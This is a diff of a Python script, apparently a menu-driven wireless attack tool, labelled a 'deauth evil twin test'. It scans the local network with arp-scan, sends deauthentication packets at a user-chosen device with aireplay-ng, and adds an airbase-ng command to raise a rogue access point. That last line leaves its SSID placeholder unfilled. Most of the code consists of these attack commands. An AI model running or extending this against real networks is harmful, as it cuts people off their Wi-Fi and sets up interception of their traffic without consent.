@@ -8,10 +8,9 @@ import subprocess
 
 options = ['Deauth evil twin test','Bluetooth','Settings', 'Clear']
 Soptions = ['Connect to network','Logs','Back', 'Clear']
-net_inf = 'wlan1'
+net_inf = 'wlan0'
 APSSID = subprocess.check_output('iwgetid -r',shell=True).decode().strip()
-APMac = subprocess.check_output("iwconfig 2>/dev/null | grep -oP 'Access Point: \K\S+' | head -n 1",
-shell=True).decode().strip()	
+APMac = subprocess.check_output("iwgetid -a -r",shell=True).decode().strip()	
 
 
 #Recieves the input command to be executed
@@ -42,19 +41,17 @@ def Home():
 # Preforms Deauth Evil Twin Test
 def DETT():
 	# Deauth the selected user
-	os.system('sudo arp-scan -I wlan1 --localnet')      #scans for local IP and Mac adresses
-	print("\nPlease sellect a device")
+	os.system('sudo arp-scan -I wlan0 --localnet')      #scans for local IP and Mac adresses
+	print("\nPlease sellect a device by MAC address")
 	atk = input('\n: ')
-	os.system('sudo aireplay-ng --deauth 0 -a {} -c {} wlan0'.format(APMac,atk))      #Sends Deauth packets to target until lost connection
-	cont = input('Deauth Another Device?(Y/N)')
+	os.system('sudo aireplay-ng --deauth 9 -a {} -c {} wlan0'.format(APMac,atk))      #Sends Deauth packets to target until lost connection
+	time.sleep(1)
+	cont = input('\nDeauth Another Device?(Y/N)\n: ')
 	if cont == 'Y' or cont == 'y':
 		DETT()
 
 	# Set up the evil Twin
-	
-
-
-
+	os.system('sudo airbase-ng -e {} -c 6 wlan0')
 	Home()
 
 
